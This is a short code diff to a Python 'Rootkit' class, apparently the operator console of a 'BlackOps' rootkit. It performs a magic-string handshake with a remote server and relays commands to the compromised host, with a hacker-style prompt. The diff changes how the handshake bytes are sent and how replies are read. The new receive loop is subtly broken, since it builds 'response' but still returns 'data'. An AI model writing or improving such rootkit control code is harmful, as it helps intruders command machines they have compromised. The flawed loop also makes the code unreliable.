@@ -30,7 +30,7 @@ class Rootkit:
         print("         connected to the server")
         data = self.sock.recv(4096)
         if data == b"ablfasksbdedoefjnthvymgb":
-            self.sock.sendall(b"nbhvcrngmhbncjvkybyvbjn")
+            self.sock.send(b"nbhvcrngmhbncjvkybyvbjn")
             data = self.sock.recv(4096)
             self.id = data.decode(errors="replace")
             self.prompt = f"BlackOps::rootkit::{self.id}::#>"
@@ -42,7 +42,12 @@ class Rootkit:
         for pos_command in self.commands:
             if command.startswith(pos_command[0]):
                 self.sock.sendall(command.encode())
-                data = self.sock.recv(4096)
+                response = bytes()
+                while True:
+                    data = self.sock.recv(1024)
+                    if not data:
+                        break
+                    response+=data
                 return data
         print("invalid command!")
         return -1
